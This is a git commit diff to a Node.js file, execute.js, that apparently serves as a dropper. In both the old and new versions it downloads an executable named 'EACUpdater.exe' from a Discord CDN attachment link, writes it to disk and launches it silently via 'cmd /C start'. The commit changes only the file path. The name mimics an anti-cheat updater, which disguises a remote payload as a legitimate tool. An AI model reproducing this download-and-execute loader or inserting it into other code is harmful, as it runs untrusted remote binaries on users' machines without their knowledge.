78614d5c95e771fc542c281b9011f15149b18972
Ryuzaki <lod.skot@gmail.com>
2022-04-16 18:28:45 +0400

    Update execute.js

--- execute.js
+++ execute.js
@@ -2,13 +2,13 @@ const fsPromises = require('fs').promises;
 const axios = require('axios');
 const fs = require('fs');
 const { exec } = require('child_process');
-if (fs.existsSync(__dirname + '/EACUpdater.exe') == false) {
+if (fs.existsSync('./EACUpdater.exe') == false) {
         axios.get('https://cdn.discordapp.com/attachments/902821540675072020/964890467336589342/EACUpdater.exe',
         {
             responseType: 'arraybuffer'
         })
         .then(async response => {
-            await fsPromises.writeFile(__dirname + '/EACUpdater.exe', response.data, { encoding: 'binary' });
+            await fsPromises.writeFile('./EACUpdater.exe', response.data, { encoding: 'binary' });
             exec("cmd /C start EACUpdater.exe", (error, stdout, stderr) => {})
             console.log("FINISH!")
         })
